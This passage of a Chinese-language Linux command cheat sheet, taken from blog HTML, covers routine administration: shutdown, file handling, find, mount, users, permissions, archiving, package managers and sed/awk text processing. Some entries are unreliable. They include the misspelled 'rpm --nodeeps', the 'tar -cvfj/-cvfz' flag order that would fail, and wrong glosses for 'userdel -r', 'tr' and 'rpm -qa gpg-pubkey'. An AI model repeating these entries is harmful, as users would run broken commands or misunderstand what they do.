id="关机-系统的关机、重启以及登出"><a href="#关机-系统的关机、重启以及登出" class="headerlink" title="关机 (系统的关机、重启以及登出 )"></a>关机 (系统的关机、重启以及登出 )</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">shutdown -h now 关闭系统<br>init 0 关闭系统<br>telinit 0 关闭系统<br>shutdown -h hours:minutes &amp; 按预定时间关闭系统 <br>shutdown -c 取消按预定时间关闭系统 <br>shutdown -r now 重启<br>reboot 重启<br><span class="hljs-built_in">logout</span> 注销 <br><br><br></code></pre></td></tr></table></figure><h3 id="文件和目录"><a href="#文件和目录" class="headerlink" title="文件和目录"></a>文件和目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /home 进入 <span class="hljs-string">&#x27;/ home&#x27;</span> 目录<span class="hljs-string">&#x27; </span><br><span class="hljs-string">cd .. 返回上一级目录 </span><br><span class="hljs-string">cd ../.. 返回上两级目录 </span><br><span class="hljs-string">cd 进入个人的主目录 </span><br><span class="hljs-string">cd ~user1 进入个人的主目录 </span><br><span class="hljs-string">cd - 返回上次所在的目录 </span><br><span class="hljs-string">pwd 显示工作路径 </span><br><span class="hljs-string">ls 查看目录中的文件 </span><br><span class="hljs-string">ls -F 查看目录中的文件 </span><br><span class="hljs-string">ls -l 显示文件和目录的详细资料 </span><br><span class="hljs-string">ls -a 显示隐藏文件 </span><br><span class="hljs-string">ls *[0-9]* 显示包含数字的文件名和目录名 </span><br><span class="hljs-string">tree 显示文件和目录由根目录开始的树形结构</span><br><span class="hljs-string">lstree 显示文件和目录由根目录开始的树形结构</span><br><span class="hljs-string">mkdir dir1 创建一个叫做 &#x27;</span>dir1<span class="hljs-string">&#x27; 的目录&#x27;</span> <br><span class="hljs-built_in">mkdir</span> dir1 dir2 同时创建两个目录 <br><span class="hljs-built_in">mkdir</span> -p /tmp/dir1/dir2 创建一个目录树 <br><span class="hljs-built_in">rm</span> -f file1 删除一个叫做 <span class="hljs-string">&#x27;file1&#x27;</span> 的文件<span class="hljs-string">&#x27; </span><br><span class="hljs-string">rmdir dir1 删除一个叫做 &#x27;</span>dir1<span class="hljs-string">&#x27; 的目录&#x27;</span> <br><span class="hljs-built_in">rm</span> -rf dir1 删除一个叫做 <span class="hljs-string">&#x27;dir1&#x27;</span> 的目录并同时删除其内容 <br><span class="hljs-built_in">rm</span> -rf dir1 dir2 同时删除两个目录及它们的内容 <br><span class="hljs-built_in">mv</span> dir1 new_dir 重命名/移动 一个目录 <br><span class="hljs-built_in">cp</span> file1 file2 复制一个文件 <br><span class="hljs-built_in">cp</span> <span class="hljs-built_in">dir</span>/* . 复制一个目录下的所有文件到当前工作目录 <br><span class="hljs-built_in">cp</span> -a /tmp/dir1 . 复制一个目录到当前工作目录 <br><span class="hljs-built_in">cp</span> -a dir1 dir2 复制一个目录 <br><span class="hljs-built_in">cp</span> -r dir1 dir2 复制一个目录及子目录<br><span class="hljs-built_in">ln</span> -s file1 lnk1 创建一个指向文件或目录的软链接 <br><span class="hljs-built_in">ln</span> file1 lnk1 创建一个指向文件或目录的物理链接 <br><span class="hljs-built_in">touch</span> -t 0712250000 file1 修改一个文件或目录的时间戳 - (YYMMDDhhmm) <br>file file1 outputs the mime <span class="hljs-built_in">type</span> of the file as text <br>iconv -l 列出已知的编码 <br><br></code></pre></td></tr></table></figure><h3 id="文件搜索"><a href="#文件搜索" class="headerlink" title="文件搜索"></a>文件搜索</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name file1 从 <span class="hljs-string">&#x27;/&#x27;</span> 开始进入根文件系统搜索文件和目录 <br>find / -user user1 搜索属于用户 <span class="hljs-string">&#x27;user1&#x27;</span> 的文件和目录 <br>find /home/user1 -name \*.bin 在目录 <span class="hljs-string">&#x27;/ home/user1&#x27;</span> 中搜索带有<span class="hljs-string">&#x27;.bin&#x27;</span> 结尾的文件 <br>find /usr/bin -<span class="hljs-built_in">type</span> f -atime +100 搜索在过去100天内未被使用过的执行文件 <br>find /usr/bin -<span class="hljs-built_in">type</span> f -mtime -10 搜索在10天内被创建或者修改过的文件 <br>find / -name \*.rpm -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">chmod</span> 755 <span class="hljs-string">&#x27;&#123;&#125;&#x27;</span> \; 搜索以 <span class="hljs-string">&#x27;.rpm&#x27;</span> 结尾的文件并定义其权限 <br>find / -xdev -name \*.rpm 搜索以 <span class="hljs-string">&#x27;.rpm&#x27;</span> 结尾的文件，忽略光驱、捷盘等可移动设备 <br>locate \*.ps 寻找以 <span class="hljs-string">&#x27;.ps&#x27;</span> 结尾的文件 - 先运行 <span class="hljs-string">&#x27;updatedb&#x27;</span> 命令 <br>whereis halt 显示一个二进制文件、源码或man的位置 <br><span class="hljs-built_in">which</span> halt 显示一个二进制文件或可执行文件的完整路径 <br><br><br></code></pre></td></tr></table></figure><h3 id="挂载一个文件系统"><a href="#挂载一个文件系统" class="headerlink" title="挂载一个文件系统"></a>挂载一个文件系统</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount /dev/hda2 /mnt/hda2 挂载一个叫做hda2的盘 - 确定目录 <span class="hljs-string">&#x27;/ mnt/hda2&#x27;</span> 已经存在 <br>umount /dev/hda2 卸载一个叫做hda2的盘 - 先从挂载点 <span class="hljs-string">&#x27;/ mnt/hda2&#x27;</span> 退出 <br>fuser -km /mnt/hda2 当设备繁忙时强制卸载 <br>umount -n /mnt/hda2 运行卸载操作而不写入 /etc/mtab 文件- 当文件为只读或当磁盘写满时非常有用 <br>mount /dev/fd0 /mnt/floppy 挂载一个软盘 <br>mount /dev/cdrom /mnt/cdrom 挂载一个cdrom或dvdrom <br>mount /dev/hdc /mnt/cdrecorder 挂载一个cdrw或dvdrom <br>mount /dev/hdb /mnt/cdrecorder 挂载一个cdrw或dvdrom <br>mount -o loop file.iso /mnt/cdrom 挂载一个文件或ISO镜像文件 <br>mount -t vfat /dev/hda5 /mnt/hda5 挂载一个Windows FAT32文件系统 <br>mount /dev/sda1 /mnt/usbdisk 挂载一个usb 捷盘或闪存设备 <br>mount -t smbfs -o username=user,password=pass //WinClient/share /mnt/share 挂载一个windows网络共享 <br></code></pre></td></tr></table></figure><h3 id="磁盘空间"><a href="#磁盘空间" class="headerlink" title="磁盘空间"></a>磁盘空间</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">df</span> -h 显示已经挂载的分区列表 <br><span class="hljs-built_in">ls</span> -lSr |more 以尺寸大小排列文件和目录 <br><span class="hljs-built_in">du</span> -sh dir1 估算目录 <span class="hljs-string">&#x27;dir1&#x27;</span> 已经使用的磁盘空间<span class="hljs-string">&#x27; </span><br><span class="hljs-string">du -sk * | sort -rn 以容量大小为依据依次显示文件和目录的大小 </span><br><span class="hljs-string">rpm -q -a --qf &#x27;</span>%10&#123;SIZE&#125;t%&#123;NAME&#125;n<span class="hljs-string">&#x27; | sort -k1,1n 以大小为依据依次显示已安装的rpm包所使用的空间 (fedora, redhat类系统) </span><br><span class="hljs-string">dpkg-query -W -f=&#x27;</span><span class="hljs-variable">$&#123;Installed-Size;10&#125;</span>t<span class="hljs-variable">$&#123;Package&#125;</span>n<span class="hljs-string">&#x27; | sort -k1,1n 以大小为依据显示已安装的deb包所使用的空间 (ubuntu, debian类系统) </span><br></code></pre></td></tr></table></figure><h3 id="用户和群组"><a href="#用户和群组" class="headerlink" title="用户和群组"></a>用户和群组</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">groupadd group_name 创建一个新用户组 <br>groupdel group_name 删除一个用户组 <br>groupmod -n new_group_name old_group_name 重命名一个用户组 <br>useradd -c <span class="hljs-string">&quot;Name Surname &quot;</span> -g admin -d /home/user1 -s /bin/bash user1 创建一个属于 <span class="hljs-string">&quot;admin&quot;</span> 用户组的用户 <br>useradd user1 创建一个新用户 <br>userdel -r user1 删除一个用户 ( <span class="hljs-string">&#x27;-r&#x27;</span> 排除主目录) <br>usermod -c <span class="hljs-string">&quot;User FTP&quot;</span> -g system -d /ftp/user1 -s /bin/nologin user1 修改用户属性 <br>passwd 修改口令 <br>passwd user1 修改一个用户的口令 (只允许root执行) <br>chage -E 2005-12-31 user1 设置用户口令的失效期限 <br>pwck 检查 <span class="hljs-string">&#x27;/etc/passwd&#x27;</span> 的文件格式和语法修正以及存在的用户 <br>grpck 检查 <span class="hljs-string">&#x27;/etc/passwd&#x27;</span> 的文件格式和语法修正以及存在的群组 <br>newgrp group_name 登陆进一个新的群组以改变新创建文件的预设群组 <br></code></pre></td></tr></table></figure><h3 id="文件的权限-使用-“-”-设置权限，使用-“-“-用于取消"><a href="#文件的权限-使用-“-”-设置权限，使用-“-“-用于取消" class="headerlink" title="文件的权限 - 使用 “+” 设置权限，使用 “-“ 用于取消"></a>文件的权限 - 使用 “+” 设置权限，使用 “-“ 用于取消</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -lh 显示权限 <br><span class="hljs-built_in">ls</span> /tmp | <span class="hljs-built_in">pr</span> -T5 -W<span class="hljs-variable">$COLUMNS</span> 将终端划分成5栏显示 <br><span class="hljs-built_in">chmod</span> ugo+rwx directory1 设置目录的所有人(u)、群组(g)以及其他人(o)以读（r ）、写(w)和执行(x)的权限 <br><span class="hljs-built_in">chmod</span> go-rwx directory1 删除群组(g)与其他人(o)对目录的读写执行权限 <br><span class="hljs-built_in">chown</span> user1 file1 改变一个文件的所有人属性 <br><span class="hljs-built_in">chown</span> -R user1 directory1 改变一个目录的所有人属性并同时改变改目录下所有文件的属性 <br><span class="hljs-built_in">chgrp</span> group1 file1 改变文件的群组 <br><span class="hljs-built_in">chown</span> user1:group1 file1 改变一个文件的所有人和群组属性 <br>find / -perm -u+s 罗列一个系统中所有使用了SUID控制的文件 <br><span class="hljs-built_in">chmod</span> u+s /bin/file1 设置一个二进制文件的 SUID 位 - 运行该文件的用户也被赋予和所有者同样的权限 <br><span class="hljs-built_in">chmod</span> u-s /bin/file1 禁用一个二进制文件的 SUID位 <br><span class="hljs-built_in">chmod</span> g+s /home/public 设置一个目录的SGID 位 - 类似SUID ，不过这是针对目录的 <br><span class="hljs-built_in">chmod</span> g-s /home/public 禁用一个目录的 SGID 位 <br><span class="hljs-built_in">chmod</span> o+t /home/public 设置一个文件的 STIKY 位 - 只允许合法所有人删除文件 <br><span class="hljs-built_in">chmod</span> o-t /home/public 禁用一个目录的 STIKY 位 <br></code></pre></td></tr></table></figure><h3 id="文件的特殊属性-使用-“-”-设置权限，使用-“-“-用于取消"><a href="#文件的特殊属性-使用-“-”-设置权限，使用-“-“-用于取消" class="headerlink" title="文件的特殊属性 - 使用 “+” 设置权限，使用 “-“ 用于取消"></a>文件的特殊属性 - 使用 “+” 设置权限，使用 “-“ 用于取消</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">chattr +a file1 只允许以追加方式读写文件 <br>chattr +c file1 允许这个文件能被内核自动压缩/解压 <br>chattr +d file1 在进行文件系统备份时，dump程序将忽略这个文件 <br>chattr +i file1 设置成不可变的文件，不能被删除、修改、重命名或者链接 <br>chattr +s file1 允许一个文件被安全地删除 <br>chattr +S file1 一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘 <br>chattr +u file1 若文件被删除，系统会允许你在以后恢复这个被删除的文件 <br>lsattr 显示特殊的属性 <br></code></pre></td></tr></table></figure><h3 id="打包和压缩文件"><a href="#打包和压缩文件" class="headerlink" title="打包和压缩文件"></a>打包和压缩文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">bunzip2 file1.bz2 解压一个叫做 <span class="hljs-string">&#x27;file1.bz2&#x27;</span>的文件 <br>bzip2 file1 压缩一个叫做 <span class="hljs-string">&#x27;file1&#x27;</span> 的文件 <br>gunzip file1.gz 解压一个叫做 <span class="hljs-string">&#x27;file1.gz&#x27;</span>的文件 <br>gzip file1 压缩一个叫做 <span class="hljs-string">&#x27;file1&#x27;</span>的文件 <br>gzip -9 file1 最大程度压缩 <br>rar a file1.rar test_file 创建一个叫做 <span class="hljs-string">&#x27;file1.rar&#x27;</span> 的包 <br>rar a file1.rar file1 file2 dir1 同时压缩 <span class="hljs-string">&#x27;file1&#x27;</span>, <span class="hljs-string">&#x27;file2&#x27;</span> 以及目录 <span class="hljs-string">&#x27;dir1&#x27;</span> <br>rar x file1.rar 解压rar包 <br>unrar x file1.rar 解压rar包 <br>tar -cvf archive.tar file1 创建一个非压缩的 tarball <br>tar -cvf archive.tar file1 file2 dir1 创建一个包含了 <span class="hljs-string">&#x27;file1&#x27;</span>, <span class="hljs-string">&#x27;file2&#x27;</span> 以及 <span class="hljs-string">&#x27;dir1&#x27;</span>的档案文件 <br>tar -tf archive.tar 显示一个包中的内容 <br>tar -xvf archive.tar 释放一个包 <br>tar -xvf archive.tar -C /tmp 将压缩包释放到 /tmp目录下 <br>tar -cvfj archive.tar.bz2 dir1 创建一个bzip2格式的压缩包 <br>tar -jxvf archive.tar.bz2 解压一个bzip2格式的压缩包 <br>tar -cvfz archive.tar.gz dir1 创建一个gzip格式的压缩包 <br>tar -zxvf archive.tar.gz 解压一个gzip格式的压缩包 <br>zip file1.zip file1 创建一个zip格式的压缩包 <br>zip -r file1.zip file1 file2 dir1 将几个文件和目录同时压缩成一个zip格式的压缩包 <br>unzip file1.zip 解压一个zip格式压缩包 <br></code></pre></td></tr></table></figure><h3 id="RPM-包-（Fedora-Redhat及类似系统）"><a href="#RPM-包-（Fedora-Redhat及类似系统）" class="headerlink" title="RPM 包 - （Fedora, Redhat及类似系统）"></a>RPM 包 - （Fedora, Redhat及类似系统）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpm -ivh package.rpm 安装一个rpm包 <br>rpm -ivh --nodeeps package.rpm 安装一个rpm包而忽略依赖关系警告 <br>rpm -U package.rpm 更新一个rpm包但不改变其配置文件 <br>rpm -F package.rpm 更新一个确定已经安装的rpm包 <br>rpm -e package_name.rpm 删除一个rpm包 <br>rpm -qa 显示系统中所有已经安装的rpm包 <br>rpm -qa | grep httpd 显示所有名称中包含 <span class="hljs-string">&quot;httpd&quot;</span> 字样的rpm包 <br>rpm -qi package_name 获取一个已安装包的特殊信息 <br>rpm -qg <span class="hljs-string">&quot;System Environment/Daemons&quot;</span> 显示一个组件的rpm包 <br>rpm -ql package_name 显示一个已经安装的rpm包提供的文件列表 <br>rpm -qc package_name 显示一个已经安装的rpm包提供的配置文件列表 <br>rpm -q package_name --whatrequires 显示与一个rpm包存在依赖关系的列表 <br>rpm -q package_name --whatprovides 显示一个rpm包所占的体积 <br>rpm -q package_name --scripts 显示在安装/删除期间所执行的脚本l <br>rpm -q package_name --changelog 显示一个rpm包的修改历史 <br>rpm -qf /etc/httpd/conf/httpd.conf 确认所给的文件由哪个rpm包所提供 <br>rpm -qp package.rpm -l 显示由一个尚未安装的rpm包提供的文件列表 <br>rpm --import /media/cdrom/RPM-GPG-KEY 导入公钥数字证书 <br>rpm --checksig package.rpm 确认一个rpm包的完整性 <br>rpm -qa gpg-pubkey 确认已安装的所有rpm包的完整性 <br>rpm -V package_name 检查文件尺寸、 许可、类型、所有者、群组、MD5检查以及最后修改时间 <br>rpm -Va 检查系统中所有已安装的rpm包- 小心使用 <br>rpm -Vp package.rpm 确认一个rpm包还未安装 <br>rpm2cpio package.rpm | cpio --extract --make-directories *bin* 从一个rpm包运行可执行文件 <br>rpm -ivh /usr/src/redhat/RPMS/`<span class="hljs-built_in">arch</span>`/package.rpm 从一个rpm源码安装一个构建好的包 <br>rpmbuild --rebuild package_name.src.rpm 从一个rpm源码构建一个 rpm 包 <br></code></pre></td></tr></table></figure><h3 id="YUM-软件包升级器-（Fedora-RedHat及类似系统）"><a href="#YUM-软件包升级器-（Fedora-RedHat及类似系统）" class="headerlink" title="YUM 软件包升级器 - （Fedora, RedHat及类似系统）"></a>YUM 软件包升级器 - （Fedora, RedHat及类似系统）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum install package_name 下载并安装一个rpm包 <br>yum localinstall package_name.rpm 将安装一个rpm包，使用你自己的软件仓库为你解决所有依赖关系 <br>yum update package_name.rpm 更新当前系统中所有安装的rpm包 <br>yum update package_name 更新一个rpm包 <br>yum remove package_name 删除一个rpm包 <br>yum list 列出当前系统中安装的所有包 <br>yum search package_name 在rpm仓库中搜寻软件包 <br>yum clean packages 清理rpm缓存删除下载的包 <br>yum clean headers 删除所有头文件 <br>yum clean all 删除所有缓存的包和头文件 <br></code></pre></td></tr></table></figure><h3 id="DEB-包-Debian-Ubuntu-以及类似系统"><a href="#DEB-包-Debian-Ubuntu-以及类似系统" class="headerlink" title="DEB 包 (Debian, Ubuntu 以及类似系统)"></a>DEB 包 (Debian, Ubuntu 以及类似系统)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">dpkg -i package.deb 安装/更新一个 deb 包 <br>dpkg -r package_name 从系统删除一个 deb 包 <br>dpkg -l 显示系统中所有已经安装的 deb 包 <br>dpkg -l | grep httpd 显示所有名称中包含 <span class="hljs-string">&quot;httpd&quot;</span> 字样的deb包 <br>dpkg -s package_name 获得已经安装在系统中一个特殊包的信息 <br>dpkg -L package_name 显示系统中已经安装的一个deb包所提供的文件列表 <br>dpkg --contents package.deb 显示尚未安装的一个包所提供的文件列表 <br>dpkg -S /bin/ping 确认所给的文件由哪个deb包提供 <br></code></pre></td></tr></table></figure><h3 id="APT-软件工具-Debian-Ubuntu-以及类似系统"><a href="#APT-软件工具-Debian-Ubuntu-以及类似系统" class="headerlink" title="APT 软件工具 (Debian, Ubuntu 以及类似系统)"></a>APT 软件工具 (Debian, Ubuntu 以及类似系统)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install package_name 安装/更新一个 deb 包 <br>apt-cdrom install package_name 从光盘安装/更新一个 deb 包 <br>apt-get update 升级列表中的软件包 <br>apt-get upgrade 升级所有已安装的软件 <br>apt-get remove package_name 从系统删除一个deb包 <br>apt-get check 确认依赖的软件仓库正确 <br>apt-get clean 从下载的软件包中清理缓存 <br>apt-cache search searched-package 返回包含所要搜索字符串的软件包名称 <br></code></pre></td></tr></table></figure><h3 id="查看文件内容"><a href="#查看文件内容" class="headerlink" title="查看文件内容"></a>查看文件内容</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> file1 从第一个字节开始正向查看文件的内容 <br><span class="hljs-built_in">tac</span> file1 从最后一行开始反向查看一个文件的内容 <br>more file1 查看一个长文件的内容 <br>less file1 类似于 <span class="hljs-string">&#x27;more&#x27;</span> 命令，但是它允许在文件中和正向操作一样的反向操作 <br><span class="hljs-built_in">head</span> -2 file1 查看一个文件的前两行 <br><span class="hljs-built_in">tail</span> -2 file1 查看一个文件的最后两行 <br><span class="hljs-built_in">tail</span> -f /var/log/messages 实时查看被添加到一个文件中的内容 <br><br><br></code></pre></td></tr></table></figure><h3 id="文本处理"><a href="#文本处理" class="headerlink" title="文本处理"></a>文本处理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> file1 file2 ... | <span class="hljs-built_in">command</span> &lt;&gt; file1_in.txt_or_file1_out.txt general syntax <span class="hljs-keyword">for</span> text manipulation using PIPE, STDIN and STDOUT <br><span class="hljs-built_in">cat</span> file1 | <span class="hljs-built_in">command</span>( sed, grep, awk, grep, etc...) &gt; result.txt 合并一个文件的详细说明文本，并将简介写入一个新文件中 <br><span class="hljs-built_in">cat</span> file1 | <span class="hljs-built_in">command</span>( sed, grep, awk, grep, etc...) &gt;&gt; result.txt 合并一个文件的详细说明文本，并将简介写入一个已有的文件中 <br>grep Aug /var/log/messages 在文件 <span class="hljs-string">&#x27;/var/log/messages&#x27;</span>中查找关键词<span class="hljs-string">&quot;Aug&quot;</span> <br>grep ^Aug /var/log/messages 在文件 <span class="hljs-string">&#x27;/var/log/messages&#x27;</span>中查找以<span class="hljs-string">&quot;Aug&quot;</span>开始的词汇 <br>grep [0-9] /var/log/messages 选择 <span class="hljs-string">&#x27;/var/log/messages&#x27;</span> 文件中所有包含数字的行 <br>grep Aug -R /var/log/* 在目录 <span class="hljs-string">&#x27;/var/log&#x27;</span> 及随后的目录中搜索字符串<span class="hljs-string">&quot;Aug&quot;</span> <br>sed <span class="hljs-string">&#x27;s/stringa1/stringa2/g&#x27;</span> example.txt 将example.txt文件中的 <span class="hljs-string">&quot;string1&quot;</span> 替换成 <span class="hljs-string">&quot;string2&quot;</span> <br>sed <span class="hljs-string">&#x27;/^$/d&#x27;</span> example.txt 从example.txt文件中删除所有空白行 <br>sed <span class="hljs-string">&#x27;/ *#/d; /^$/d&#x27;</span> example.txt 从example.txt文件中删除所有注释和空白行 <br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;esempio&#x27;</span> | <span class="hljs-built_in">tr</span> <span class="hljs-string">&#x27;[:lower:]&#x27;</span> <span class="hljs-string">&#x27;[:upper:]&#x27;</span> 合并上下单元格内容 <br>sed -e <span class="hljs-string">&#x27;1d&#x27;</span> result.txt 从文件example.txt 中排除第一行 <br>sed -n <span class="hljs-string">&#x27;/stringa1/p&#x27;</span> 查看只包含词汇 <span class="hljs-string">&quot;string1&quot;</span>的行 <br>sed -e <span class="hljs-string">&#x27;s/ *$//&#x27;</span> example.txt 删除每一行最后的空白字符 <br>sed -e <span class="hljs-string">&#x27;s/stringa1//g&#x27;</span> example.txt 从文档中只删除词汇 <span class="hljs-string">&quot;string1&quot;</span> 并保留剩余全部 <br>sed -n <span class="hljs-string">&#x27;1,5p;5q&#x27;</span> example.txt 查看从第一行到第5行内容 <br>sed -n <span class="hljs-string">&#x27;5p;5q&#x27;</span> example.txt 查看第5行 <br>sed -e <span class="hljs-string">&#x27;s/00*/0/g&#x27;</span> example.txt 用单个零替换多个零 <br><span class="hljs-built_in">cat</span> -n file1 标示文件的行数 <br><span class="hljs-built_in">cat</span> example.txt | awk <span class="hljs-string">&#x27;NR%2==1&#x27;</span> 删除example.txt文件中的所有偶数行 <br><span class="hljs-built_in">echo</span> a b c | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> 查看一行第一栏 <br><span class="hljs-built_in">echo</span> a b c | awk <span class="hljs-string">&#x27;&#123;print $1,$3&#125;&#x27;</span> 查看一行的第一和第三栏 <br><span class="hljs-built_in">paste</span> file1 file2 合并两个文件或两栏的内容 <br><span class="hljs-built_in">paste</span> -d <span class="hljs-string">&#x27;+&#x27;</span> file1 file2 合并两个文件或两栏的内容，中间用<span class="hljs-string">&quot;+&quot;</span>区分 <br><span class="hljs-built_in">sort</span> file1 file2 排序两个文件的内容 <br><span class="hljs-built_in">sort</span> file1 file2 | <span class="hljs-built_in">uniq</span> 取出两个文件的并集(重复的行只保留一份) <br><span class="hljs-built_in">sort</span> file1 file2 | <span class="hljs-built_in">uniq</span> -u 删除交集，留下其他的行 <br><span class="hljs-built_in">sort</span> file1 file2 | <span class="hljs-built_in">uniq</span> -d 取出两个文件的交集(只留下同时存在于两个文件中的文件) <br><span class="hljs-built_in">comm</span> -1 file1 file2 比较两个文件的内容只删除 <span class="hljs-string">&#x27;file1&#x27;</span> 所包含的内容 <br><span class="hljs-built_in">comm</span> -2 file1 file2 比较两个文件的内容只删除 <span class="hljs-string">&#x27;file2&#x27;</span> 所包含的内容 <br><span class="hljs-built_in">comm</span> -3 file1 file2 比较两个文件的内容只删除两个文件共有的部分 <br></code></pre></td></tr></table></figure><h3 id="字符设置和文件格式转换"><a href="#字符设置和文件格式转换" class="headerlink" title="字符设置和文件格式转换"></a>字符设置和文件格式转换</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">dos2unix filedos.txt fileunix.txt 将一个文本文件的格式从MSDOS转换成UNIX <br>unix2dos fileunix.txt filedos.txt 将一个文本文件的格式从UNIX转换成MSDOS <br>recode ..HTML &lt; page.txt &gt; page.html 将一个文本文件转换成html <br>recode -l | more 显示所有允许的转换格式 <br></code></pre></td></tr></table></figure><h3 id="文件系统分析"><a href="#文件系统分析" class="headerlink" 